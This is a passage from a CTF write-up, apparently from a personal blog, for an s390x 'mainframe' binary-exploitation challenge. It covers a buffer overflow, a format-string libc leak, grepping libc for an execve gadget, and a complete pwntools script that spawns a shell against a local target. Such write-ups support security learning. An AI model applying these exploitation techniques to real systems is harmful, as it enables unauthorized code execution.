+r12            0x7161616161616166  0x7161616161616166
+r13            0x7261616161616166  0x7261616161616166
+r14            0x7361616161616166  0x7361616161616166
+r15            0x7461616161616166  0x7461616161616166
+</code></pre></div><p>Seems that we have control over <code>r11</code>, <code>r12</code>, <code>r13</code>, <code>r14</code>, and <code>r15</code>! This is more register control than we would have in x86_64, where we have control over only <code>rbp</code> and <code>rip</code>. We know that <code>r14</code> will be jumped to at the end of the function, so we do control the return address. We also know that <code>r15</code> is the stack pointer. This should not be changed by our overflow. Lastly, we control <code>r11</code> through <code>r13</code>, which could be useful later when trying to get a shell.</p>
+<p>We look up the offsets to our saved registers with <code>cyclic -l 0x6661616161616170 -n 8</code>. (Note how I had to convert from big endian to little endian) This gives us an offset of 1120 bytes to our saved registers!</p>
+<p>The <code>mainframe</code> binary in of itself does not have a win function or anything that would be useful to call, so we will have to try to leak the libc base address in order to get a shell. We can do this with a format string. This format string leak can be done in the same way as we would usually do a format string leak, so I will not cover the details here. However, there are two things that we must pay attention to:</p>
+<ul>
+<li>We must make sure to XOR it with <code>R</code> when we are finished.</li>
+<li>Because this is big-endian, the first two bytes are null. So, if we want to leak with <code>%s</code>, we must offset our address by 2 to get the non-null bytes.</li>
+</ul>
+<p>I used this python snippet with pwntools to generate the format string payload<!-- raw HTML omitted --><a href="#f2">[2]</a><!-- raw HTML omitted -->:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">xor(<span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#34;%6$s</span><span style="color:#0ff;font-weight:bold">\0\0\0\0</span><span style="color:#0ff;font-weight:bold">&#34;</span> + p64(elf.got.puts+<span style="color:#ff0;font-weight:bold">2</span>), <span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#34;R&#34;</span>)
+</code></pre></div><p>We can parse this with u64() in pwntools, which will automatically use big endian for p64() and u64() if we set the context correctly.</p>
+<p>Now that we have a leak, we can use our overflow to return back to the main function and do another overflow, this time with a leak!</p>
+<h2 id="finding-shell-gadgets---grep-for-the-win">Finding shell gadgets - Grep for the win!</h2>
+<p>Now that we have control of the program control flow and a leak, we can jump to an address that will give us a shell! On x86_64, I would use a one_gadget to spawn a shell. However, there are no tools (that I know of) that will do this on s390x. I&rsquo;m not even sure if there are any one_gadgets on this version of the s390x libc. However, remembering that we have control over <code>r11</code>, <code>r12</code>, and <code>r13</code>, we can find something that&rsquo;s close enough.</p>
+<p>First of all, we need to look into syscalls in the s390x architecture. Finding a place where the <code>execve</code> syscall is being called is a good first step in finding somewhere that will spawn a shell. I found a <a href="https://github.com/torvalds/linux/blob/master/arch/s390/kernel/syscalls/syscall.tbl">table</a> of syscall numbers int the kernel source code, which tells us that <code>execve</code> is syscall 11. Referring back to the table of instructions found earlier, we find that the <code>svc</code> instruction is used to call a syscall. We chain <code>objdump</code> and <code>grep</code> to find where this syscall is used:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ s390x-linux-gnu-objdump -d libc.so.6  | grep -B 3 -
+A 3 &#39;svc\s*11$&#39;
+   d9bfe:       07 07                   nopr    %r7
+
+00000000000d9c00 &lt;execve@@GLIBC_2.2&gt;:
+   d9c00:       0a 0b                   svc     11
+   d9c02:       a7 49 f0 01             lghi    %r4,-4095
+   d9c06:       b9 21 00 24             clgr    %r2,%r4
+   d9c0a:       c0 b4 00 00 00 04       jgnl    d9c12 &lt;execve@@GLIBC_2.2+0x12&gt;
+</code></pre></div><p>There&rsquo;s only one location where <code>execve</code> is called, at the beginning of the <code>execve()</code> function. We use the same strategy to find where <code>execve()</code> is called, and we find this gadget:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ s390x-linux-gnu-objdump -d libc.so.6  | grep -B 3 -A 3 &#39;d9c00&#39;
+                                ...
+   da680:       b3 cd 00 49             lgdr    %r4,%f9
+   da684:       b3 cd 00 3e             lgdr    %r3,%f14
+   da688:       b9 04 00 2d             lgr     %r2,%r13
+   da68c:       c0 e5 ff ff fa ba       brasl   %r14,d9c00 &lt;execve@@GLIBC_2.2&gt;
+   da692:       e3 10 b0 a0 00 04       lg      %r1,160(%r11)
+   da698:       e3 60 10 00 00 04       lg      %r6,0(%r1)
+   da69e:       58 16 a0 00             l       %r1,0(%r6,%r10)
+                                ...
+</code></pre></div><p>Jumping to <code>libc base + 0xda688</code> will load the contents of <code>r13</code> into <code>r2</code> (where the first argument of the syscall is called), then call <code>execve()</code>, which will call the <code>execve</code> syscall!</p>
+<p>Because we control <code>r13</code>, we can put the address of <code>/bin/sh</code> (which is present in libc because of the <code>system</code> function) into the first argument passed to <code>excecve</code>, hope that <code>r3</code> and <code>r4</code> are 0, and spawn a shell!<!-- raw HTML omitted --><a href="#f3">[3]</a><!-- raw HTML omitted --></p>
+<p>That gives us our final exploit path:</p>
+<ul>
+<li>Leak libc address by using the format string to read from the GOT</li>
+<li>Return to main because we control <code>r14</code></li>
+<li>Return to the shell gadget while setting <code>r13</code> to a pointer to <code>/bin/sh</code></li>
+</ul>
+<h2 id="putting-it-all-together">Putting it all together</h2>
+<p>Here&rsquo;s my solve script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">from</span> pwn <span style="color:#fff;font-weight:bold">import</span> *
+
+elf = ELF(<span style="color:#0ff;font-weight:bold">&#34;./mainframe&#34;</span>)
+libc = ELF(<span style="color:#0ff;font-weight:bold">&#34;./libc.so.6&#34;</span>)
+context.arch = <span style="color:#0ff;font-weight:bold">&#34;s390&#34;</span>
+context.bits = <span style="color:#ff0;font-weight:bold">64</span>
+conn = remote(<span style="color:#0ff;font-weight:bold">&#34;localhost&#34;</span>, <span style="color:#ff0;font-weight:bold">9999</span>)
+
+payload = xor(<span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#34;%6$s</span><span style="color:#0ff;font-weight:bold">\0\0\0\0</span><span style="color:#0ff;font-weight:bold">&#34;</span> + p64(elf.got.puts+<span style="color:#ff0;font-weight:bold">2</span>), <span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#34;R&#34;</span>)
+payload = payload.ljust(<span style="color:#ff0;font-weight:bold">1120</span>, <span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#34;a&#34;</span>)
+payload += p64(<span style="color:#ff0;font-weight:bold">0</span>)  <span style="color:#007f7f"># r11</span>
+payload += p64(<span style="color:#ff0;font-weight:bold">0</span>)  <span style="color:#007f7f"># r12</span>
+payload += p64(<span style="color:#ff0;font-weight:bold">0</span>)  <span style="color:#007f7f"># r13</span>
+payload += p64(elf.sym.main) <span style="color:#007f7f"># r14</span>
+conn.send(payload) <span style="color:#007f7f"># ret2main</span>
+
+conn.recvuntil(<span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#34;...</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+libc.address = u64(<span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\0\0</span><span style="color:#0ff;font-weight:bold">&#34;</span> + conn.recv(<span style="color:#ff0;font-weight:bold">6</span>)) - libc.sym.puts <span style="color:#007f7f"># leak libc</span>
+info(<span style="color:#0ff;font-weight:bold">&#34;libc @ &#34;</span> + <span style="color:#fff;font-weight:bold">hex</span>(libc.address))
+
+payload = <span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#34;&#34;</span>
+payload = payload.ljust(<span style="color:#ff0;font-weight:bold">1120</span>, <span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#34;a&#34;</span>)
+payload += p64(<span style="color:#ff0;font-weight:bold">0</span>)  <span style="color:#007f7f"># r11</span>
+payload += p64(<span style="color:#ff0;font-weight:bold">0</span>)  <span style="color:#007f7f"># r12</span>
+payload += p64(<span style="color:#fff;font-weight:bold">next</span>(libc.search(<span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#39;/bin/sh&#39;</span>))) <span style="color:#007f7f"># r13, gets popped into r2</span>
+payload += p64(libc.address + <span style="color:#ff0;font-weight:bold">0xda680</span>) <span style="color:#007f7f"># r14, our shell gadget</span>
+conn.send(payload)
+
+conn.interactive()
+</code></pre></div><p>This gets us a shell, and we can run <code>cat flag</code> to get the flag<!-- raw HTML omitted --><a href="#f4">[4]</a><!-- raw HTML omitted -->: <code>USCG{RIIdiculouslyAwesome_5d4b48559f6ee937b9cbfc809bafad62}</code></p>
+<hr>
+<p><!-- raw HTML omitted -->[1]<!-- raw HTML omitted --> The organizers were not able to host the challenge as something that players could connect to, so instead we had to submit solve scripts through a (glitchy) submission box on CTFd. I believe that my submission didn&rsquo;t go through the first time I solved it.😭<a href="#a1">↩</a></p>
+<p><!-- raw HTML omitted -->[2]<!-- raw HTML omitted --> Originally, I used <code>%p</code> to leak the libc address, but this was different on the debug and testing environments, probably because the stack was shifted around as a result of the different environments. A more reliable way was to use the GOT to leak, which is what I did in this writeup. <a href="#a2">↩</a></p>
+<p><!-- raw HTML omitted -->[3]<!-- raw HTML omitted --> After some discussion with others, it seems that some people were able to utilize the <code>system</code> function, or find a gadget to arbitrarily set <code>r2</code>. But I like this method because it&rsquo;s the first thing that I found in libc. 🙂<a href="#a3">↩</a></p>
+<p><!-- raw HTML omitted -->[4]<!-- raw HTML omitted --> This was actually DMed to us afterwards, as the organizers ran the solve scripts against their own infrastructure rather than having players to run them. <a href="#a4">↩</a></p>
+
+        </div>
+
+    </article>
+
+</div>
+
+
+            <footer class="footer">    
+</footer>
+
+        </div>
+    </body>
+
+    
+
+</html>
